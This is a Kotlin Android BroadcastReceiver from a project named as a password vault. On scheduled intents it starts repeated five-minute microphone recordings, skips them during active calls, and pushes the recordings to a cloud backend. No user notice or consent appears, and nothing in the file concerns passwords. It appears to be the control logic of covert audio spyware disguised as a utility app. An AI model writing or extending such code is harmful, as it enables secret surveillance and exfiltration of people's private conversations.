package com.example.passwordvault.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.util.Log
import com.example.passwordvault.util.PreferenceUtil
import com.example.passwordvault.util.Recorder
import com.example.passwordvault.util.Scheduler
import com.example.passwordvault.util.WorkerProvider
import com.example.passwordvault.util.logger.log

const val FIVEMIN_RECORDING_STARTER = "com.japps.5minRecording.starter"
const val FIVEMIN_RECORDING_PUSHER = "com.japps.5minRecording.cloud.pusher"

private val tag = FiveMinRecordingReceiver::class.java.simpleName

class FiveMinRecordingReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {

        intent?.let {
            log(tag, "Intent -> ${it.action}")
        }

        when {
            intent?.action.equals(FIVEMIN_RECORDING_STARTER) -> context?.run {

                val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager

                if (Recorder.activeCall(audioManager)) {
                    log(tag, "Already in call, mic can't be recorded")
                    return
                }

                PreferenceUtil.micRecordingCount(context).let {
                    if (it > 6) {
                        PreferenceUtil.writeMicRecordingCount(context, 0)
                        Scheduler.cancel5minRecorder(context)
                        return
                    } else
                        PreferenceUtil.writeMicRecordingCount(context, it + 1)
                }
                WorkerProvider.start5MinRecorderWork(context)
            }

            intent?.action.equals(FIVEMIN_RECORDING_PUSHER) -> context?.run {
                WorkerProvider.cloudPush5MinRecording(context)
            }

            else -> {
                Log.e(tag, "Unrecognized action in the receiver")
            }
        }
    }
}